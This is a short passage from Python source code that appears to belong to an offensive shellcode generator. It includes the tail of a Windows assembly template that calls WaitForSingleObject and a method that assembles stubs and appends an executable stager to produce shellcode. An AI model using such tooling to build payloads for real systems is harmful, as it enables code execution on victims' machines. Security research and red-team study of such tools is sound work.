    mov rcx, rax
    xor rdx, rdx
    dec rdx
    mov rax, [rbp - {self.storage_offsets['WaitForSingleObject']}]
    call rax\n"""

        return src

    def get_shellcode(self):
        """Generates shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    self.exit_func)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        src += self.rva_to_offset()
        src += "exe_file:\n"

        shellcode = generator.get_bytes_from_asm(src)
        shellcode += self.exe_stager

        return shellcode
